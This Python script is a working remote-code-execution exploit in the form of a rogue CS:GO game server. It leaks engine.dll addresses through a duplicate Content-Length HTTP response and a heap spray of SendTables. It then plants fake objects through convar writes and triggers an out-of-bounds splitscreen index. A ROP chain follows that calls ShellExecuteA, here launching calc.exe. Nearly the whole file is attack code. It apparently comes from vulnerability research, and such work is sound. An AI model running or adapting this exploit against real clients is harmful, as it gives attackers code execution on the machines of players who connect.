#!/usr/bin/env python3

import socket
import struct
import os
import sys
import threading
import time
import binascii

# Helper functions.
u32 = lambda x: struct.unpack("<I", x)[0]
p32 = lambda x: struct.pack("<I", x)
p16 = lambda x: struct.pack("<H", x)

### Tunables for target.
CLIENT_VERSION = 13786

# These offsets can all be found in engine.dll These convars have xrefs to
# functions, there are instructions that move a data offset into ecx, those are
# these offsets
SV_DOWNLOADURL_CONVAR_OFF = 0x595fe0
SV_CONSISTENCY_CONVAR_OFF = 0x05966c8
SV_VOICECODEC_CONVAR_OFF  = 0x596788
# This offset can be found dynamicall by inspecting the crash site.
SPLITSCREEN_SLOT_ARRAY_OFF = 0x58EFE0

# offset of the pointer to the value of a convar relative to the beginning of the convar object
CONVAR_STRING_VAL_OFF = 0x24
CONVAR_INT_VAL_OFF = 0x30

# offset of the vtable pointer we are leaking from the base of engine.dll
OFFSET_VTABLE = 0x4a144c
EXPLOIT_INDEX = (((SV_DOWNLOADURL_CONVAR_OFF + CONVAR_STRING_VAL_OFF )- SPLITSCREEN_SLOT_ARRAY_OFF) // 4) -1


####################

# Standard connect packets.
CONNECT_REQ_RES = bytes([255, 255, 255, 255, 65, 84, 95, 221, 11, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 99, 111, 110, 110, 101, 99, 116, 48, 120, 48, 48, 48, 48, 48, 48, 48, 48, 0])
CONNECT_REQ_RES += p32(CLIENT_VERSION)
CONNECT_REQ_RES += bytes([0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0])

CONNECT_REQ_RES2 =bytes([255, 255, 255, 255, 66, 46, 48, 48, 48, 48, 48, 48, 48, 48, 46, 48, 48, 48, 48, 46, 48, 48, 48, 48, 46, 48, 48, 48, 48, 46, 48, 48, 48, 48, 46, 0])

# add path to be able to import relative modules.
current_path = os.getcwd()
parent_dir = os.path.normpath(os.path.join(current_path, "../.."))
sys.path.append(parent_dir)
import netmessages_pb2 as nmsg
import cstrike15_usermessages_pb2 as umsg
import ice as ice
import bitwriter
import bitreader
import packetparser
from exception import Ex

# More helper functions
def ptr_to_color(addr, convar_addr):
    addr ^= convar_addr
    color = ""
    for pbyte in p32(addr):
        color += f"{pbyte} "

    return color 

# Returns the ICE key based on the version:
def get_ice_key(csgo_version):
    csgo = bytes([ord("C"), ord("S"), ord("G"), ord("O")])

    version_4_8 = bytes([
        csgo_version & 0xff,
        (csgo_version >> 8) & 0xff,
        (csgo_version >> 16) & 0xff,
        (csgo_version >> 24) & 0xff
    ])

    version_8_12 = bytes([
        (csgo_version >> 2) & 0xff,
        (csgo_version >> 10) & 0xff,
        (csgo_version >> 18) & 0xff,
        (csgo_version >> 26) & 0xff
    ])

    version_12_16 = bytes([
        (csgo_version >> 4) & 0xff,
        (csgo_version >> 12) & 0xff,
        (csgo_version >> 20) & 0xff,
        (csgo_version >> 28) & 0xff
    ])

    return csgo + version_4_8 + version_8_12 + version_12_16

def int_encoded(val):
    ret = b""

    while val > 0x7f:
        ret += bytes([(val & 0x7f) | 0x80])
        val >>= 7

    ret += bytes([val & 0x7f])
    return ret

# Try to get the local network address, as we need an non-loopback ip for the server.
# this works even if you are currently NOT connected to an 10.0.0.0/8 subnet
def get_local_network_addr():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.255.255.255", 1))
        return s.getsockname()[0]
    except Exception as e:
        print(f"[-] Failed to get local addr: {e}")
        sys.exit(1)
    finally:
        s.close()

def get_payload(ty, **kwargs):
    def get_svc_split_screen():
        payload = nmsg.CSVCMsg_SplitScreen()
        payload.type = 0
        payload.slot = EXPLOIT_INDEX
        payload.player_index = 0 

        return payload, 22

    def get_net_msg_player_avatar_data(accid):
        payload = nmsg.CNETMsg_PlayerAvatarData()
        payload.accountid = accid
        payload.rgb = b"\x00" + b"\x41" * (0xffa0)
        return payload, 100
 
    if ty == 'avatar':
        return get_net_msg_player_avatar_data(**kwargs)
    elif ty == 'splitscreen':
        return get_svc_split_screen()
    else:
        assert(0 and "Not implemented")

# Set a ConVar on the target client.
def set_convar(name, value):
    payload = nmsg.CNETMsg_SetConVar()
    add = payload.convars.cvars.add()
    add.name = name
    add.value = value

    return payload, 6

# Returns the CSVCMsg_ServerInfo message with all the necessary server information.
def get_server_info():
    server_info = nmsg.CSVCMsg_ServerInfo()
    server_info.protocol = CLIENT_VERSION
    server_info.server_count = 1
    server_info.is_dedicated = True
    server_info.is_official_valve_server = False
    server_info.is_hltv = False 
    server_info.is_replay = False
    server_info.is_redirecting_to_proxy_relay = False
    server_info.c_os = ord('L')
    server_info.max_clients = 10
    server_info.player_slot = 1
    server_info.tick_interval = 0.007815

    server_info.max_classes = 20
    server_info.game_dir = "csgo"
    server_info.map_name = "de_dust2"

    return server_info, 8

# Returns a StringTable message that contains the "downloadables", this is used for the leak.
def get_download_list(filenames):
    download_table = nmsg.CSVCMsg_CreateStringTable()
    download_table.name = "downloadables"
    download_table.max_entries = 8192
    download_table.num_entries = len(filenames)
    download_table.user_data_size = 0
    download_table.user_data_fixed_size = 0
    download_table.user_data_size_bits = 0
    download_table.flags = 0

    models = [(fn, None) for fn in filenames]
    data = bitwriter.BitWriter()
    data.write_bit(0)           # do not use dictionary encoding
    for k, v in models:
        data.write_bit(1)       # use sequental indexes
        data.write_bit(1)       # enter if to set pEntry
        data.write_bit(0)       # don't do substr check
        data.write_str(k)
        if v is None:
            data.write_bit(0) # pUserData
        else:
            data.write_bit(1) # pUserData
            data.write_bits(14, len(v))
            for c in v:
                data.write_char(c)

    download_table.string_data = data.finish()

    return download_table, 12

# Set the model pre-cache this is necessary for the connection.
def get_model_table():
    model_table = nmsg.CSVCMsg_CreateStringTable()
    model_table.name = "modelprecache"
    model_table.max_entries = 8192
    model_table.num_entries = 2
    model_table.user_data_size = 0
    model_table.user_data_fixed_size = 0
    model_table.user_data_size_bits = 0
    model_table.flags = 0

    models = [
            ("", None),
            ("maps/de_dust2.bsp", None),
            ]
    data = bitwriter.BitWriter()
    data.write_bit(0)           # do not use dictionary encoding
    for k, v in models:
        data.write_bit(1)       # use sequental indexes
        data.write_bit(1)       # enter if to set pEntry 
        data.write_bit(0)       # don't do substr check
        data.write_str(k)
        if v is None:
            data.write_bit(0)   # pUserData???
        else:
            data.write_bit(1)   # pUserData???
            data.write_bits(14, len(v))
            for c in v:
                data.write_char(c)


    model_table.string_data = data.finish()
    return model_table, 12

def get_nop():
    nop = nmsg.CNETMsg_NOP()
    return nop, 0

# Request the file from the client. This is used for the leak.
def get_netmsg_file(filename):
    msg = nmsg.CNETMsg_File()
    msg.transfer_id = 1
    msg.is_replay_demo_file = False
    msg.deny = False
    msg.file_name = filename

    return msg, 2

# This requests the Signon state from the client.
def get_signon_state(signonstate):
    signon = nmsg.CNETMsg_SignonState()
    signon.signon_state = signonstate # SIGNONSTATE_NEW
    signon.spawn_count = 1
    signon.num_server_players = 0
    signon.map_name = "de_dust2"
    return signon, 7

# global connection seq & ack nr
seq_nr = 1
ack_nr = 1

# This is used to wrap the payload with the necessary encryption and also add a crc checksum.
def prepare_payload(payload, msg_num, to_ack_nr = None, rel_state = 0, serialize = True):
    global seq_nr
    global ack_nr

    assert(msg_num < 0xff)
    if to_ack_nr:
        ack_nr = to_ack_nr

    # make it optional to serialize the payload as some exploit steps
    # might need to manipulate the serialized payload on a byte level
    if serialize:
        payload = payload.SerializeToString()

    packet = bytes([rel_state])
    packet += bytes([msg_num])
    packet += int_encoded(len(payload))
    packet += payload

    # crc + other stuff

    payload = packet
    packet = (seq_nr).to_bytes(4, byteorder='little')
    seq_nr += 1
    packet += (ack_nr).to_bytes(4, byteorder='little')
    packet += b"\x00" # flags
    checksum = binascii.crc32(payload)
    packet += p16(((checksum & 0xffff) ^ ((checksum >> 16) & 0xffff)) & 0xffff)
    packet += payload

    # ice encryption

    payload = packet
    padding = 8 - ((len(payload) + 5) % 8)
    packet = bytes([padding])
    packet += b"".join([bytes([33]) for _ in range(0, padding)])
    packet += struct.pack(">I", len(payload)) # big endian for whatever reason ???
    packet += payload

    payload = packet
    # ice key must be updated with each new update, the client enforces this, nothing we can do about
    crypter = ice.IceKey(2, get_ice_key(CLIENT_VERSION))
    packet = crypter.Encrypt(payload)
    payload = packet

    return payload

# setup http server for file transfer. Needed for memleak
def setup_http_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    server.bind((get_local_network_addr(), port))

    server.listen(20)
    return server

# This is basis for the info leak, we serve a file with *two* Content-Length fields, that are differently parsed.
# Which leads the client to read in uninitialized memory into the file, We then request this file back, which discloses
# addresses that we can use to craft our payload.
def serve_infoleak_files(server, heap_chunk_size):
    global send_memleak_file
    while True:
        conn, _ = server.accept()
        request = conn.recv(2048).decode('utf-8')
        
        # print("[!] Got HTTP request!")
        # print(f"{request}")

        # send 404 for archived file requests as uninitialized memory most likely
        # won't be a valid archive and the file will be deleted
        if ".bz2" in request:
            print("[*] Sending 404 for bz file")
            conn.send(
                bytes(
                    "HTTP/1.1 404 Not Found\r\n",
                    'utf-8'
                )
            )
        else:
            print("[*] Serving file via HTTP...")
            conn.send(
            bytes(
                f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {heap_chunk_size}\r\ncontent-length: 0\r\nConnection: closed"
                , 'utf-8'
                )   
            )

            time.sleep(1)
            send_memleak_file += 1
        conn.close()


# This is used to put some addresses into the uninitialized memory.
def spray_send_table(s, addr, nprops):
    table = nmsg.CSVCMsg_SendTable()
    table.is_end = False
    table.net_table_name = "abctable"
    table.needs_decoder = False

    for _ in range(nprops):
        prop = table.props.add()
        prop.type = 0x1337ee00
        prop.var_name = "abc"
        prop.flags = 0
        prop.priority = 0
        prop.dt_name = "whatever"
        prop.num_elements = 0
        prop.low_value = 0.0
        prop.high_value = 0.0
        prop.num_bits = 0x00ff00ff

    tosend = prepare_payload(table, 9)
    s.sendto(tosend, addr)

# The algorithm for updating a convar seems to be quite simple:
# get the strlen of the new value and if it is bigger ,deallocate the old one
# and copy the new value to the buffer
# if it is smaller, then new value will be copied to the buffer (determined by strlen)
# This means if our object contains 0 bytes, we will do the following:
# Send the full object (without the null bytes)
# Then, send the object but only send everything until the last 0 byte and 
# work out way towards the beginning of the object. This works because the algorithm
# does not clear the buffer after each change
def send_fake_object(target, object, addr, last=False):
    global s
    # find out where all the 0 bytes are at
    nullbytes = [i for i in reversed(range(len(object))) if object[i] == 0 ]

    # patch them out of the object to send it all
    patched_object = b"ABCD"
    for c in object:
        if c != 0:
            patched_object += bytes([ord('Y')])
        else:
            patched_object += bytes([ord('A')])

    patched_object = patched_object[0:len(patched_object)-4]
    convar, msg_num = set_convar(target, patched_object.decode('utf-8'))
    # convert the convar to a protobuf packet and then patch the pointer values back in
    convar = convar.SerializeToString()
    msg_idx = 0
    while msg_idx < len(convar) and convar[msg_idx:msg_idx+4] != b"ABCD":
        msg_idx += 1

    convar_replaced = convar[0:msg_idx]
    for i in range(len(object)):
        if object[i] != 0:
            convar_replaced += bytes([object[i]])
        else:
            convar_replaced += b'A'

    assert(len(convar) == len(convar_replaced))
    to_send = prepare_payload(convar_replaced, msg_num, serialize=False)
    s.sendto(to_send, addr)
    time.sleep(0.15)

    if len(nullbytes) > 0:
        send_fake_object(target, object[0:nullbytes.pop()], addr)
    elif last:
        return
    else:
        send_fake_object(target, object, addr, True)

# expects an absolute addr, e.g. client_dll_base + SV_INFINITE_AMMO_OFF + 0x24
# Get the address of the array base also from the debugger from the.
# this from the debugger.
def calculate_entity_bug_offset(addr_offset, array_offset):
    offset = (addr_offset - array_offset) % (2**32)
    return offset // 0x10

# This will get filled in later.
engine_base = 0
files_received = []
# packet parser placeholder
pp = None
# socket
s = None
send_memleak_file = 0
heap_chunk_size = 0x20d0

def main():
    global pp
    global s
    # start the HTTP server in a seperate thread to start listening in the background
    print("[*] Starting HTTP server to serve memleaked files")
    server_sock = setup_http_server(8000)
    threading.Thread(target=serve_infoleak_files, args=(server_sock, heap_chunk_size)).start()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", 1337))
    print("[+] Listening on 0.0.0.0:1337")

    # Build filenames for the leak.
    num = 4
    base = f"memleak{int(time.time())}" 
    ext = "pwn"
    filenames = [f"{base}{i}.{ext}" for i in range(num)]

    # What to do with the data that we leak.
    def leak_callback(fn, data):
        global files_received
        global pp
        global engine_base

        files_received.append(fn)
        pp = packetparser.PacketParser(leak_callback)

        for i in range(len(data) - 0x54):
            vtable_ptr = struct.unpack('<I', data[i:i+4])[0]
            table_type = struct.unpack('<I', data[i+8:i+12])[0]
            table_nbits = struct.unpack('<I', data[i+12:i+16])[0]
            if table_type == 0x1337ee00 and table_nbits == 0x00ff00ff:
                engine_base = vtable_ptr - OFFSET_VTABLE
                print(f"vtable_ptr={hex(vtable_ptr)}")
                break

    pp = packetparser.PacketParser(leak_callback)

    def do_leak(addr, filenames):
        global send_memleak_file
        global files_received
        global pp
        global s
        while True:
            # poc
            # req file
            # leak starts here
            print("[*] Sending server info to initialize string tables")
            server_info, msg_num = get_server_info()
            to_send = prepare_payload(server_info, msg_num)
            s.sendto(to_send, addr)

            print(f"[*] Sending sv_downloadurl http://{get_local_network_addr()}:8000 ConVar to prepare for download")
            convar, msg_num = set_convar("sv_downloadurl", f"http://{get_local_network_addr()}:8000")
            to_send = prepare_payload(convar, msg_num)
            s.sendto(to_send, addr)


            print("[*] Sending creating 'downloadables' string table")
            downloadbles, msg_num = get_download_list(filenames)
            to_send = prepare_payload(downloadbles, msg_num)
            s.sendto(to_send, addr)

            print("[*] Sending modelprecache string table")
            model_table, msg_num = get_model_table()
            to_send = prepare_payload(model_table, msg_num)
            s.sendto(to_send, addr)

            print("[*] Sending Signon_State 'CONNTECTED' to setup client state")
            signon, msg_num = get_signon_state(2)
            to_send = prepare_payload(signon, msg_num)
            s.sendto(to_send, addr)


            print("[*] Spraying heap with SendTables...", end='')
            for _ in range(256):
                spray_send_table(s, addr, 100)
            print(" Done")

            print("[*] Sendinfg Signon_State 'NEW' to trigger downloads")
            signon, msg_num = get_signon_state(3)
            to_send = prepare_payload(signon, msg_num)
            s.sendto(to_send, addr)

            while send_memleak_file != len(filenames):
                time.sleep(0.01)
            send_memleak_file = 0
            print("[*] Sending download request")
            invert = False
            for f in filenames:
                # print(f"leaking {f}")
                fl, msg_num = get_netmsg_file(f)
                to_send = prepare_payload(fl, msg_num)
                s.sendto(to_send, addr)
                while not (f in files_received):
                    packet, addr = s.recvfrom(0xffff)
                    try:
                        to_ack_nr, _ = pp.on_packet(packet)
                        if to_ack_nr:
                            # print(f"sending subchan reset {hex(rel_state)} for {to_ack_nr}")
                            payload, msg_num = get_nop()
                            to_send = prepare_payload(payload, msg_num, to_ack_nr, 0xff if not invert else 0x00)
                            invert = not invert
                            # to_send = prepare_payload(payload, msg_num, to_ack_nr, rel_state)
                            s.sendto(to_send, addr)
                    except Ex as e:
                        if "unpad" in e.m:
                            print(f"[-] got exception {e.m} :: non fatal error, continuing...")
                            continue
                        print(packet)
                        print(e.m)
                        # with open(f"perr/p{err_num}", "wb") as f:
                        #     f.write(packet)
                        # err_num += 1
                    except Ex as e:
                        print(f"Got non userdefined exception: {e}")
                if engine_base != 0:
                    break
            files_received = []
            # print("All recv'd")

            return engine_base


    # Actual exploit logic starts here.

    while True:
        # accept a client's connect
        client_connect_req, addr = s.recvfrom(0xffff)
        if u32(client_connect_req[:4]) != 0xffffffff:
            print("[-] Got unknown connection")
            continue
        print(f"[+] Client tries to connect from {addr}")

        s.sendto(CONNECT_REQ_RES, addr)
        print(f"[!] Send proxied response")

        (client_connect_req2, addr) = s.recvfrom(0xffff)
        if u32(client_connect_req2[:4]) != 0xffffffff:
            print("[-] Second stage client connect didn't pass checks")
            continue
        print(f"[+] Got second stage of client connect")

        s.sendto(CONNECT_REQ_RES2, addr)
        print(f"[!] Send second stage connect response")

        (some_stuff, addr) = s.recvfrom(0xffff)
        print(f"[+] Second stage accepted")

        engine = do_leak(addr, filenames)
        rop_entry_location = engine + SV_CONSISTENCY_CONVAR_OFF + CONVAR_INT_VAL_OFF - 0xAC
        print(f"[+] Got engine.dll base @ {hex(engine)}")


        o = lambda x: x - 0x10000000

        mov_esp_ebx = o(0x1001e718) # : mov esp, ebx; pop ebx; ret;
        mov_peax_edx = o(0x10012f62) # : mov dword ptr [eax], edx ; ret
        pop_eax = o(0x10019df1) # : pop eax ; ret
        pop_edx = o(0x10035cd5) # : pop edx ; ret
        xor_edx_edx = o(0x100a4af3) # : xor edx, edx ; ret
        jmp_eax = o(0x1004f5ff) # : jmp dword ptr [eax]
        pop_ebx = o(0x10002d57) # : pop ebx ; ret
        inc_edx = o(0x1000b14a) # : inc edx ; ret
        mov_ebx_eax = o(0x10209439) # : mov ebx, eax ; mov edx, dword ptr [ecx] ; call dword ptr [edx + 8]

        # just some rw mem we need for the new stack
        OFFSET_ENGINE_RW_SECTION = o(0x13918f10)

        # These are the offsets in the engine.dll
        OFFSET_SLEEP = o(0x1027EBC4)
        OFFSET_SHELLEXECUTE_A = o(0x1043f2c0)
        ret = o(0x100014db) # : ret

        def strcpy(s, to):
            rop = memcpy(s, to)
            rop += p32(engine + pop_eax)
            rop += p32(to + len(s))
            rop += p32(engine + xor_edx_edx)
            rop += p32(engine + mov_peax_edx)
            return rop

        def memcpy(s, to):
            assert(len(s) % 4 == 0 and len(s) > 0)
            rop = b""
            for i in range(0, len(s), 4):
                rop += p32(engine + pop_eax)
                rop += p32(to + i)
                rop += p32(engine + pop_edx)
                rop += s[i:i+4].encode()
                rop += p32(engine + mov_peax_edx)
            return rop


        one_shot_gadget = engine + mov_esp_ebx

        rop = b"\x00\x41\x41\x41" # null byte to trigger exp path
        rop += p32(engine + pop_eax) # remove the vtable from the stack
        rop += p32(0x6a6a6a6a) # convar vtable for first gagdet in here
        rop += strcpy("calc.exe", engine + OFFSET_ENGINE_RW_SECTION + 0x50) # simple strcpy
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x20)
        rop += p32(engine + pop_edx)
        rop += p32(engine + jmp_eax)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x24)
        rop += p32(engine + pop_edx)
        rop += p32(engine + OFFSET_SLEEP)
        rop += p32(engine + mov_peax_edx)

        rop += p32(engine + xor_edx_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x28)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x2c)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x30)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x34)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x38)
        rop += p32(engine + mov_peax_edx)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x3c)
        rop += p32(engine + inc_edx)
        rop += p32(engine + mov_peax_edx)

        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x40)
        rop += p32(engine + pop_edx)
        rop += p32(0x41414141)
        rop += p32(engine + mov_peax_edx)

        rop += p32(engine + pop_edx)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x50)
        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x30)
        rop += p32(engine + mov_peax_edx)

        rop += p32(engine + pop_eax)
        rop += p32(engine + OFFSET_SHELLEXECUTE_A) # shellexecute 

        rop += p32(engine + pop_ebx)
        rop += p32(engine + OFFSET_ENGINE_RW_SECTION + 0x1c)
        rop += p32(engine + mov_esp_ebx)

        convar, msg_num = set_convar("sv_consistency", ptr_to_color(one_shot_gadget, engine + SV_CONSISTENCY_CONVAR_OFF))
        tosend = prepare_payload(convar, msg_num)
        s.sendto(tosend, addr)

        vtable_location = engine + SV_VOICECODEC_CONVAR_OFF + CONVAR_STRING_VAL_OFF
        print(f"[*] Faking vtable at {hex(vtable_location)} using sv_voicecodec")
        send_fake_object("sv_voicecodec", bytes("A"*0x18 + "B"*8 + "C"*400, 'latin1'), addr)

        # fake the objects that are required!
        splitscreen_location = engine + SV_DOWNLOADURL_CONVAR_OFF + CONVAR_STRING_VAL_OFF

        print(f"[*] Faking splitscreen object at {hex(splitscreen_location)} using sv_downloadurl")
        send_fake_object("sv_downloadurl", rop, addr)

        # TODO:
        # add this point, implement some signal between the main thread and the HTTP server to wait until all files have been downloaded so that we can use NETMsg_File to 
        # request them and egghunt
        # this is just to have a chunk of controlled mem, where we can exchange the ptrs in the debugger
        print(f"[+] sending payload")
        pay, msg_num = get_payload('avatar', accid = 1)
        to_send = prepare_payload(pay, msg_num)
        s.sendto(to_send, addr)

        print(f"[+] sending oob")
        pay, msg_num = get_payload('splitscreen')
        to_send = prepare_payload(pay, msg_num)
        s.sendto(to_send, addr)

        print(f"[+] Done")
        exit(0)

main()
